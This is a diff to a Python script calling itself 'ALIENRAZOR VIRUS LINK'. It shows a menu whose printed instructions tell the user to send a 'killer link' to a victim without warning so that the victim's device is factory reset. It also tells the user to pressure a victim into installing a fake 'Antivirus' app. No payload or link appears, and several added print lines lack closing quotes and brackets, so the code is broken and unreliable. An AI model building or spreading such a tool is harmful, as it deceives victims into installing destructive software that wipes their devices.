@@ -38,11 +38,12 @@ logo ="""
                          7J
                          .        
             
-              ALIENRAZOR VIRUS LINK\033[0;96m     
+                   
 """                         
 def menu():  
     os.system ("clear")
     print(logo)
+    print ("            ALIENRAZOR VIRUS LINK\033[0;96m
     print ("")
     print ("              [1] KILLER LINK ")
     print ("              [2] SAVE")
@@ -62,6 +63,7 @@ def menu():
 def data1():
     os.system ("clear")
     print(logo)
+    print ("            ALIENRAZOR KILLER LINK\033[0;96m 
     print ("")
     print ("\n\n COPY BELOW LINK AND SEND IT YOUR VICTIM \n AND SAY NOTHING TO HIM. \n WHEN HE INSTALL IT IN HIS DEVICE \n IT WILL BE FACTORY RESET \n AND LOT MORE HAPPENS.")
     print ("              👇👇👇 ")
@@ -83,6 +85,7 @@ def data1():
 def data():
     os.system("clear")
     print(logo)
+    print ("    \033[0;92m           SAVE LINK ")
     print ("")
     print ("\n\n \033[0;96mCOPY BELOW LINK AND SEND IT YOUR VICTIM AND TELL HIM. \n THAT he SHOULD INSTALL THIS  APPLICATION OR ELSE \n HIS DEVICE WILL NOT BE RECOVERED.(Antivirus)")
     print ("                   👇👇👇  ")
